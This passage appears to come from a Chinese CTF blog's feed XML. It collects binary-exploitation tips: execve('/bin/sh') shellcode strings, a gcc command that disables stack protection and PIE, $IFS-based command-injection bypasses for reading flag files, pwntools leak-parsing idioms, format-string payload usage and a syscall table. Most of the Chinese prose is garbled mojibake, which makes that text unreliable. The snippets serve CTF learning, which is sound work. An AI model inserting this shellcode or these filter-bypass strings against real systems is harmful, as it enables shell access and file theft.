class="line"> </span><br><span class="line"><span class="comment"># 64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64ä½ çº¯asciiå­—ç¬¦shellcode</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="gdb">GDB</span></h2><ul>
<li><strong>plt</strong>
æŸ¥çœ‹ plt è¡¨å†…å®¹</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/6.png"></p>
<ul>
<li><strong>got</strong>
æŸ¥çœ‹ got è¡¨å†…å®¹</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/7.png"></p>
<ul>
<li><strong>vmmap</strong>
vmmap â€“ å¯ä»¥ç”¨æ¥æŸ¥çœ‹æ ˆã€bssæ®µæ˜¯å¦å¯ä»¥æ‰§è¡Œ</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/8.png"></p>
<ul>
<li><strong>distance</strong>
ç”¨äºè®¡ç®—ä¸¤åœ°å€çš„è·ç¦»
<code>distance åœ°å€ åœ°å€</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/9.png"></p>
<ul>
<li><strong>disassemble</strong>
ç”¨äºæŸ¥çœ‹æŸæ®µä»£ç çš„æ±‡ç¼–æŒ‡ä»¤
<code>disassemble åœ°å€</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/10.png"></p>
<ul>
<li><strong>attach</strong>
è°ƒè¯•
<code>gdb.attach(p)</code></li>
<li><strong>print</strong>
æŸ¥çœ‹å˜é‡åœ°å€
<code>print å‡½æ•°å</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/11.png"></p>
<hr>
<h2><span id="å…¶ä»–">å…¶ä»–</span></h2><p><strong>gccå‘½ä»¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc &lt;cæ–‡ä»¶å&gt; -o &lt;ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å&gt;</span><br></pre></td></tr></table></figure>

<p><strong>gccç¼–è¯‘è¿è¡Œcæ–‡ä»¶ï¼ˆLinuxç³»ç»Ÿï¼‰</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1ã€æ–°å»º.cæ–‡ä»¶</span><br><span class="line">2ã€åœ¨å½“å‰ç›®å½•ä¸‹æ‰“å¼€ç»ˆç«¯</span><br><span class="line">3ã€è¾“å…¥æŒ‡ä»¤ï¼š</span><br><span class="line">   gcc  -c  æ–‡ä»¶å.c</span><br><span class="line">   gcc  æ–‡ä»¶å.o  -o æ–‡ä»¶å</span><br><span class="line">   ./æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p><strong>ä¸å¼€å¯PIEä¿æŠ¤</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -s test.c -o <span class="built_in">test</span>  </span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="relro-x2f-stack-x2f-nx-x2f-pie">Relro &#x2F; Stack &#x2F; NX &#x2F; PIE</span></h2><ul>
<li><strong>Full Relroï¼ˆé‡å®šä½è¡¨åªè¯»ï¼‰</strong>
Relocation Read Onlyï¼Œ .got å’Œ .plt åªè¯»</li>
<li><strong>No Canary foundï¼ˆèƒ½æ ˆæº¢å‡ºï¼‰</strong></li>
<li><strong>NX enableï¼ˆä¸å¯æ‰§è¡Œå†…å­˜ï¼‰</strong>
Non-Executable Memory</li>
<li><strong>PIE enableï¼ˆå¼€å¯ASLR åœ°å€éšæœºåŒ–ï¼‰</strong>
Address space layout randomization</li>
</ul>
<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>æ°´å¹³ä¸€ç›´åœæ»ä¸å‰ï¼Œä¸€ç›´åœ¨åŸåœ°è¸æ­¥ï¼Œæ”¾æ¾å¿ƒæƒ…ï¼ŒåŠ æ²¹åŠ æ²¹ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æŠ€å·§</category>
        <category>æ–¹æ³•</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! æŠ€å·§ (4)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! æŠ€å·§ (4)</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹:</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (2)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (3)</a></p>
<p>ç´§æ¥ä¸Šè¿°æŠ€å·§ï¼ˆ1ï¼‰ã€æŠ€å·§ï¼ˆ2ï¼‰å’ŒæŠ€å·§ï¼ˆ3ï¼‰ï¼Œè¿™æ¬¡æ€»ç»“ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ã€é‡å®šå‘å’Œä¸€äº›æ•´æ•°æº¢å‡ºéœ€è¦äº†è§£çš„çŸ¥è¯†ç‚¹ï¼Œè¿˜æœ‰ä¸€äº›æ¥æ”¶å‘é€çš„å‘½ä»¤ã€‚</p>
<hr>
<h2><span id="shellå‘½ä»¤">shellå‘½ä»¤</span></h2><p>ï¼ˆ1ï¼‰$IFS$1</p>
<p>å®ƒæ˜¯ä¸€ä¸ª shell å˜é‡ï¼Œç”¨äºå®šä¹‰åˆ†éš”ç¬¦æ¥è¿›è¡Œå•è¯åˆ†å‰²ã€‚<code>$1</code> æ˜¯ shell è„šæœ¬ä¸­çš„ä½ç½®å‚æ•°ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<p>ï¼ˆ2ï¼‰tac${IFS}f*</p>
<p><code>tac$&#123;IFS&#125;f*</code> æ˜¯ä¸€ä¸ª shell å‘½ä»¤ï¼Œå®ƒä½¿ç”¨ <code>tac</code> å‘½ä»¤æ¥åå‘è¿æ¥æ–‡ä»¶ã€‚<code>$&#123;IFS&#125;</code> è¡¨ç¤º IFS å˜é‡çš„å€¼ï¼Œå®ƒç”¨äºåœ¨ <code>tac</code> å’Œ <code>f*</code> ä¹‹é—´æ·»åŠ åˆ†éš”ç¬¦ã€‚<code>f*</code> æ˜¯ä¸€ä¸ªæ–‡ä»¶åæ¨¡å¼ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ä¸­ä»¥ f å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p>
<p>ï¼ˆ3ï¼‰nl${IFS}f*</p>
<p><code>nl$&#123;IFS&#125;f*</code> æ˜¯ä¸€ä¸ª shell å‘½ä»¤ï¼Œå®ƒä½¿ç”¨ <code>nl</code> å‘½ä»¤æ¥ä¸ºæ–‡ä»¶æ·»åŠ è¡Œå·ã€‚<code>$&#123;IFS&#125;</code> è¡¨ç¤º IFS å˜é‡çš„å€¼ï¼Œå®ƒç”¨äºåœ¨ <code>nl</code> å’Œ <code>f*</code> ä¹‹é—´æ·»åŠ åˆ†éš”ç¬¦ã€‚<code>f*</code> æ˜¯ä¸€ä¸ªæ–‡ä»¶åæ¨¡å¼ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ä¸­ä»¥ f å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p>
<p>å› æ­¤ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ä¸ºå½“å‰ç›®å½•ä¸­ä»¥ f å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶æ·»åŠ è¡Œå·ã€‚</p>
<p>ï¼ˆ4ï¼‰tail .&#x2F;*</p>
<p><code>tail ./*</code> æ˜¯ä¸€ä¸ª shell å‘½ä»¤ï¼Œå®ƒä½¿ç”¨ <code>tail</code> å‘½ä»¤æ¥æ˜¾ç¤ºæ–‡ä»¶çš„æœ€åå‡ è¡Œã€‚<code>./</code> è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ<code>*</code> æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ã€‚</p>
<p>å› æ­¤ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯æ˜¾ç¤ºå½“å‰ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶çš„æœ€åå‡ è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>tail</code> å‘½ä»¤æ˜¾ç¤ºæ¯ä¸ªæ–‡ä»¶çš„æœ€å 10 è¡Œã€‚</p>
<p>ï¼ˆ5ï¼‰é‡å®šå‘ç»„åˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0 &amp;&amp; <span class="built_in">tac</span> fl*</span><br><span class="line"><span class="built_in">tac</span> fl* &gt;&amp;0</span><br><span class="line"><span class="built_in">tac</span> fl* &gt;&amp;2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è§£é‡Šè§ FSCTF 2023 PWN</p>
</blockquote>
<hr>
<h2><span id="é‡å®šå‘">é‡å®šå‘</span></h2><p>åœ¨ Linux shell ä¸­ï¼Œ<code>&gt;&amp;0</code>ã€<code>&gt;&amp;1</code> å’Œ <code>&gt;&amp;2</code> éƒ½æ˜¯é‡å®šå‘æ“ä½œç¬¦ï¼Œç”¨äºå°†è¾“å‡ºé‡å®šå‘åˆ°ä¸åŒçš„åœ°æ–¹ï¼š</p>
<ul>
<li><code>&gt;&amp;0</code>ï¼šè¿™ä¸ªæ“ä½œç¬¦å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦0ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å…¥ã€‚ç„¶è€Œï¼Œè¿™é€šå¸¸æ²¡æœ‰ä»€ä¹ˆå®é™…ç”¨é€”ï¼Œå› ä¸ºæ ‡å‡†è¾“å…¥é€šå¸¸ç”¨äºè¯»å–è¾“å…¥ï¼Œè€Œä¸æ˜¯å†™å…¥è¾“å‡ºã€‚</li>
<li><code>&gt;&amp;1</code>ï¼šè¿™ä¸ªæ“ä½œç¬¦å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºã€‚è¿™æ˜¯é»˜è®¤çš„è¾“å‡ºç›®æ ‡ï¼Œæ‰€ä»¥ä½ é€šå¸¸ä¸éœ€è¦æ˜¾å¼åœ°ä½¿ç”¨è¿™ä¸ªæ“ä½œç¬¦ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½ä¼šæƒ³è¦å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨<code>2&gt;&amp;1</code>ã€‚</li>
<li><code>&gt;&amp;2</code>ï¼šè¿™ä¸ªæ“ä½œç¬¦å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦2ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºã€‚è¿™é€šå¸¸ç”¨äºè¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªå‘½ä»¤å¯èƒ½ä¼šäº§ç”Ÿé”™è¯¯ï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ“ä½œç¬¦å°†é”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š<code>command 2&gt; error.txt</code>ã€‚</li>
</ul>
<p>å¸¸è§ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0</span><br></pre></td></tr></table></figure>

<p>å®ƒå°†æ ‡å‡†è¾“å‡ºï¼ˆæ–‡ä»¶æè¿°ç¬¦ 1ï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼ˆæ–‡ä»¶æè¿°ç¬¦ 0ï¼‰</p>
<hr>
<h2><span id="æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</span></h2><p>æ•´æ•°æº¢å‡ºæ˜¯æŒ‡åœ¨è®¡ç®—æœºä¸­å¯¹æ•´æ•°ç±»å‹è¿›è¡Œè¿ç®—æ—¶ï¼Œç»“æœè¶…å‡ºäº†è¯¥ç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ã€‚</p>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>èŒƒå›´</th>
<th>å ç”¨å­—èŠ‚</th>
</tr>
</thead>
<tbody><tr>
<td><code>char</code></td>
<td>-128 ~ 127</td>
<td>1 å­—èŠ‚</td>
</tr>
<tr>
<td><code>unsigned char</code></td>
<td>0 ~ 255</td>
<td>1 å­—èŠ‚</td>
</tr>
<tr>
<td><code>short</code></td>
<td>-32768 ~ 32767</td>
<td>2 å­—èŠ‚</td>
</tr>
<tr>
<td><code>unsigned short</code></td>
<td>0 ~ 65535</td>
<td>2 å­—èŠ‚</td>
</tr>
<tr>
<td><code>int8</code></td>
<td>-128 ~ 127</td>
<td>1 å­—èŠ‚</td>
</tr>
<tr>
<td><code>uint8</code></td>
<td>0 ~ 255</td>
<td>1 å­—èŠ‚</td>
</tr>
<tr>
<td><code>int16</code></td>
<td>-32768 ~ 32767</td>
<td>2 å­—èŠ‚</td>
</tr>
<tr>
<td><code>uint16</code></td>
<td>0 ~ 65535</td>
<td>2 å­—èŠ‚</td>
</tr>
<tr>
<td><code>int32</code></td>
<td>-2147483648 ~ 2147483647</td>
<td>4 å­—èŠ‚</td>
</tr>
<tr>
<td><code>uint32</code></td>
<td>0 ~ 4294967295</td>
<td>4 å­—èŠ‚</td>
</tr>
<tr>
<td><code>int64</code></td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
<td>8 å­—èŠ‚</td>
</tr>
<tr>
<td><code>uint64</code></td>
<td>0 ~ 18446744073709551615</td>
<td>8 å­—èŠ‚</td>
</tr>
<tr>
<td><code>long32</code></td>
<td>-2147483648 ~ 2147483647</td>
<td>4 å­—èŠ‚</td>
</tr>
<tr>
<td><code>ulong32</code></td>
<td>0 ~ 4294967295</td>
<td>4 å­—èŠ‚</td>
</tr>
<tr>
<td><code>long64</code></td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
<td>8 å­—èŠ‚</td>
</tr>
<tr>
<td><code>ulong64</code></td>
<td>0 ~ 18446744073709551615</td>
<td>8 å­—èŠ‚</td>
</tr>
</tbody></table>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/1.png"></p>
<hr>
<h2><span id="pwntools">Pwntools</span></h2><p>åˆ©ç”¨ <code>pwntools</code> å·¥å…·æ¥æ¥æ”¶å‘é€æ•°æ®ï¼Œåœ¨åšé¢˜çš„æ—¶å€™æˆ‘è®¤ä¸ºè¿˜æ˜¯éå¸¸é‡è¦çš„ï¼Œæ‰€ä»¥è®°å½•ä¸€æ‰‹ï¼Œå¤§å®¶ä¸€èµ·å…±å‹‰<del>_</del></p>
<p>å‘é€æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(data)               <span class="comment"># å‘é€æ•°æ® data</span></span><br><span class="line">p.sendline(data)           <span class="comment"># å‘é€ä¸€è¡Œæ•°æ® dataï¼ŒåŠ ä¸Šæ¢è¡Œç¬¦</span></span><br><span class="line">p.sendafter(data, payload) <span class="comment"># æ¥æ”¶åˆ° data åå‘é€ payload</span></span><br><span class="line">p.sendlineafter(data, payload) <span class="comment"># æ¥æ”¶åˆ° data åå‘é€ payload å¹¶æ¢è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>æ¥æ”¶æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv(n)                  <span class="comment"># æ¥æ”¶æŒ‡å®š n å­—èŠ‚</span></span><br><span class="line">p.recvn(n)                 <span class="comment"># æ¥æ”¶ n å­—ç¬¦</span></span><br><span class="line">p.recvall()                <span class="comment"># æ¥æ”¶æ‰€æœ‰æ•°æ®</span></span><br><span class="line">p.recvline()               <span class="comment"># æ¥æ”¶ä¸€è¡Œï¼ˆåˆ°æ¢è¡Œç¬¦ï¼‰</span></span><br><span class="line">p.recvlines(n)             <span class="comment"># æ¥æ”¶ n è¡Œ</span></span><br><span class="line">p.recvuntil(data)          <span class="comment"># æ¥æ”¶åˆ° data ä¸ºæ­¢</span></span><br><span class="line">p.recvuntil(data, drop=<span class="literal">True</span>)  <span class="comment"># æ¥æ”¶ç›´åˆ° dataï¼ˆå¦‚ &#x27;\nTell&#x27;ï¼‰</span></span><br></pre></td></tr></table></figure>

<p>ç¤ºä¾‹ï¼šå¦‚ä½•æ¥æ”¶åˆ° <code>0x4038f64e0f1c4200</code></p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># æˆ–è€…ï¼š</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># æˆ–è€…ï¼š</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p><code>p.recv()</code> å’Œ <code>p.recvn()</code> æœ‰ä»€ä¹ˆåŒºåˆ«</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/3.png"></p>
<p>32 ä½å¦‚ä½•æ¥å—å­—ç¬¦ä¸²</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/4.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># æå–å 4 å­—èŠ‚</span></span><br><span class="line">pythonåˆ‡ç‰‡ï¼š[-<span class="number">4</span>:]ï¼Œä»£ç å¯ä»¥ç¡®ä¿ä»…æå–æ¥æ”¶åˆ°çš„æ•°æ®çš„æœ€åå››ä¸ªå­—èŠ‚ï¼Œè€Œä¸è€ƒè™‘æ•°æ®çš„å‰é¢éƒ¨åˆ†</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/5.png"></p>
<p>64 ä½å¦‚ä½•æ¥å—å­—ç¬¦ä¸²</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/6.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">num = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">num = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/7.png"></p>
<hr>
<h2><span id="fmtstr">Fmtstr</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;address:data&#125;, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>offset</code>ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»</li>
<li><code>numbwritten</code>ï¼šå·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°</li>
<li><code>write_size</code>ï¼šå†™å…¥æ–¹å¼ï¼ˆ<code>byte</code>&#x3D;<code>hhn</code>ï¼Œ<code>short</code>&#x3D;<code>hn</code>ï¼Œ<code>int</code>&#x3D;<code>n</code>ï¼‰ï¼Œé»˜è®¤ä¸º <code>byte</code></li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼šéƒ¨åˆ†é¢˜ç›®é™åˆ¶æ—¶é—´ï¼Œpwntools ç”Ÿæˆçš„ payload å¯èƒ½å¤±æ•ˆã€‚
å¯é€šè¿‡ä¿®æ”¹ä½åœ°å€ç­‰æ–¹å¼å‡å°è¾“å‡ºé•¿åº¦ï¼Œéœ€æ‰‹åŠ¨æ„é€  payloadã€‚</p>
</blockquote>
<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>å¤šåšå¤šæ€»ç»“ï¼Œæ…¢æ…¢çš„è¦å¼€å§‹è¿›æ”»å †äº†ï¼ŒåŠ æ²¹åŠ æ²¹ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>æŠ€å·§</category>
        <category>æ–¹æ³•</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! æŠ€å·§ (3)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! æŠ€å·§ (3)</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (2)</a></p>
<p>ç´§æ¥ä¸Šè¿°æŠ€å·§ï¼ˆ1ï¼‰å’ŒæŠ€å·§ï¼ˆ2ï¼‰ï¼Œè¿™æœŸæ•´ç†ä¸€äº› Linux ç³»ç»Ÿè°ƒç”¨å·å’Œä¸€äº›ç¼–ç çš„å‘½ä»¤ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p>
<hr>
<h2><span id="linux-ç³»ç»Ÿè°ƒç”¨å·è¡¨">Linux ç³»ç»Ÿè°ƒç”¨å·è¡¨</span></h2><h3><span id="32-ä½">32 ä½</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span 